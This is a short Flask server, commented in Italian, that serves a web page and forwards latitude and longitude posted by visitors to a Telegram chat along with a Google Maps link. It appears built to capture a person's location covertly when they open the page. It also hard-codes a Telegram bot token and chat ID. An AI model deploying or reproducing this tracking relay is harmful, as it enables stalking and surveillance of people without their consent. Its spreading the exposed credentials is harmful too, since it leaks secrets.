from flask import Flask, request, jsonify, send_from_directory
import requests
import os

app = Flask(__name__, static_folder='.')

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8677643454:AAFl0hpdVeTAVKcJrOZTeu64VKSQTk6xoQY")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "7714751615")

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')  # ✅ DEVE ESSERE COSÌ!

@app.route('/save-location', methods=['POST'])
def save_location():
    try:
        # 🔥 Forza lettura JSON (evita errori ReqBin / client vari)
        data = request.get_json(force=True)

        lat = data.get('lat')
        lon = data.get('lon')

        # ❌ Validazione base
        if not lat or not lon:
            return jsonify({"error": "Lat o Lon mancanti"}), 400

        print(f"📍 Ricevuto: {lat}, {lon}")

        maps_link = f"https://www.google.com/maps?q={lat},{lon}"

        message = (
            f"📍 Nuova posizione ricevuta!\n\n"
            f"Lat: {lat}\n"
            f"Lon: {lon}\n\n"
            f"Apri mappa:\n{maps_link}"
        )

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        response = requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": message
        })

        print("📨 Telegram response:", response.text)

        # ❌ Controllo errore Telegram
        if response.status_code != 200:
            return jsonify({"error": "Errore invio Telegram"}), 500

        return jsonify({"status": "ok"})

    except Exception as e:
        print("❌ ERRORE:", str(e))
        return jsonify({"error": str(e)}), 500


# 🚀 Avvio compatibile Render
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)